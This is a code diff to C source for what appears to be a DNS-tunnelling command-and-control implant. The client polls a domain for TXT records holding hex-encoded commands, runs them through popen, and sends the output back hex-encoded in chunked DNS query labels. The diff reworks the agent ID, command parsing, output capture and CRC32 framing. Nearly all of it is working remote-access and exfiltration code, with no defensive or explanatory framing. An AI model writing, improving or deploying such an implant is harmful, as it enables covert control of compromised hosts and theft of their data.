@@ -25,24 +25,19 @@ const char *resp_idle = "v=B2B3FE1C";
 const char *resp_error = "v=D31CFAA4";
 const char *resp_cmd = "v=A9F466E8";
 
-void reset_command(client_t *client) {
-    for (int i = 0; i < 255; i++) {
-        client->command[i] = '\0';
-    }
-}
 
 struct Client *init_client() {
 
     struct Client *client = malloc(sizeof(*client));
 
-    client->domain = DOMAIN;
     client->status = Idle;
-    reset_command(client);
 
-    rand_str(client->agent_id, sizeof(client->agent_id) - 1);
-    char *hex_agent_id = bin_str_to_hex_str(client->agent_id, sizeof(client->agent_id) - 1);
-    strncpy(client->agent_id_hex, hex_agent_id, strlen(hex_agent_id));
+    char *agent_id = rand_str(5);
+    char *agent_id_hex = bin_str_to_hex_str(agent_id, 5);
+    client->agent_id = agent_id;
+    client->agent_id_hex = agent_id_hex;
 
+    client->domain = DOMAIN;
     snprintf(client->checkin_domain,
              sizeof(client->checkin_domain),
              "%s.%s",
@@ -130,6 +125,8 @@ int send_response(client_t *client, char **data, int data_count) {
             Dprintf("[d] resp len was: %d\n", len);
 //            return 1;
         }
+
+        free(data[i]);
     }
 
     return 0;
@@ -186,14 +183,13 @@ void poll(client_t *client) {
         // to process as the value for p.
         //  ie. p=ffffff
         char *command;
+        char s[2] = "=";
 
-        char *token = strtok(txt, "=");
+        char *token = strtok(txt, s);
         while (token != NULL) {
-            command = (char *) malloc(sizeof(token) + 1);
             command = token;
-
             // continue scanning
-            token = strtok(NULL, "=");
+            token = strtok(NULL, s);
         }
 
 #ifdef DEBUG
@@ -202,10 +198,7 @@ void poll(client_t *client) {
 #endif
 
         char *c = request_hex_to_string(command);
-
-        // copy the command to the client
-        reset_command(client);
-        strncpy(client->command, c, strlen(c));
+        client->command = c;
         client->status = Command;
     }
 }
@@ -216,33 +209,38 @@ void poll(client_t *client) {
  */
 char *shell_exec_output(const char *command) {
 
-    FILE *cmd = popen(command, "r");
-    if (cmd == NULL) {
-        Dprintf("[d] error: failed to execute command %s\n", command);
+    FILE *fp;
+    size_t size, used;
+    char *data = NULL;
+    int ch;
+
+    fp = popen(command, "r");
+    if (!fp) {
+        Dprintf("[d] failed to run the command");
+        return NULL;
     }
 
-    static char buff[1024];
-    char *res = malloc(1 * sizeof(char));
-    u_int res_size = 0;
-    size_t n;
+    for (size = used = 0;;) {
+        if (used >= size) {
+            size = size ? 2 * size : 100;
+            data = realloc(data, size);
 
-    while ((n = fread(buff, 1, sizeof(buff), cmd)) > 0) {
-        char *t_res = realloc(res, strlen(res) + strlen(buff) + 1);
-        if (t_res == NULL) {
-            Dprintf("[d] reallocation for more cmd output failed\n");
-            break;
+            if (data == NULL) {
+                Dprintf("[d] realloc for command output failed");
+                return NULL;
+            }
         }
+        ch = getc(fp);
+        if (ch == EOF) break;
 
-        res = t_res;
-        strcat(res, buff);
-
-        res_size += n;
+        data[used++] = ch;
     }
+    data[used] = 0;
 
-    res[res_size + 1] = '\0';
-    pclose(cmd);
+    pclose(fp);
 
-    return res;
+    data = realloc(data, used + 1);
+    return data;
 }
 
 
@@ -298,10 +296,10 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
     // ident.type.seq.crc32.proto.datalen.data.data.data
     char init[max_label + 1];
     snprintf(init, max_label,
-             "%02hhx%02hhx.%02x.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx",
+             "%02hhx%02hhx.%02x.%d.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx",
              ident[0], ident[1],                                // ident
              stream_start,                                      // type
-             (u_int8_t) seq,                                    // seq
+             seq,                                               // seq
              (u_int8_t) 0x00,                                   // crc32
              command_protocol,                                  // proto
              (u_int8_t) 0,                                      // datalen
@@ -320,7 +318,8 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
         char byte_parts[3][data_label_all_max + 1] = {{0x00},
                                                       {0x00},
                                                       {0x00}};
-        unsigned char byte_full[data_label_all_max] = {0};
+        char byte_full[data_label_all_max] = {0};
+        int byte_full_length = 0;
 
         for (int pi = 0; pi < 3; pi++) {
 
@@ -339,7 +338,9 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
             char byte_chunk[30] = {0};
             for (int i = 0; i < chunk_len; i++) {
                 byte_chunk[i] = payload[i + data_offset];
+
                 byte_full[(30 * pi) + i] = payload[i + data_offset];
+                byte_full_length++;
             }
 
             char *as_hex = bin_str_to_hex_str(byte_chunk, chunk_len);
@@ -349,7 +350,8 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
             data_offset += 30;
         }
 
-        u_int crc = crc32(byte_full);   // TODO: fix, check spec, may need to be hex encoded
+        uint32_t crc = 0;
+        crc32((const unsigned char *) byte_full, byte_full_length, &crc);
 
         // count the byte_parts that are populated
         int data_parts = 0;
@@ -378,10 +380,10 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
         }
 
         snprintf(request, max_label,
-                 "%02hhx%02hhx.%02x.%02hhx.%02x.%02hhx.%02x.%s",
+                 "%02hhx%02hhx.%02x.%d.%02x.%02hhx.%02x.%s",
                  ident[0], ident[1],    // ident
                  stream_data,           // type
-                 (u_int8_t) seq,        // seq
+                 seq,                   // seq
                  crc,                   // crc32
                  command_protocol,      // proto
                  data_parts,            // datalen
@@ -394,13 +396,13 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
     // fin request
     char final[max_label + 1];
     snprintf(final, max_label,
-             "%02hhx%02hhx.%02x.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx",
-             ident[0], ident[1],                              // ident
-             stream_end,                                      // type
-             (u_int8_t) seq,                                   // seq
-             (u_int8_t) 0x00,                                  // crc32
-             command_protocol,                                // proto
-             (u_int8_t) 0,                                     // datalen
+             "%02hhx%02hhx.%02x.%d.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx",
+             ident[0], ident[1],                                // ident
+             stream_end,                                        // type
+             seq,                                               // seq
+             (u_int8_t) 0x00,                                   // crc32
+             command_protocol,                                  // proto
+             (u_int8_t) 0,                                      // datalen
              (u_int8_t) 0x00, (u_int8_t) 0x00, (u_int8_t) 0x00); // data
     strncpy(requests[seq], final, max_label);
 
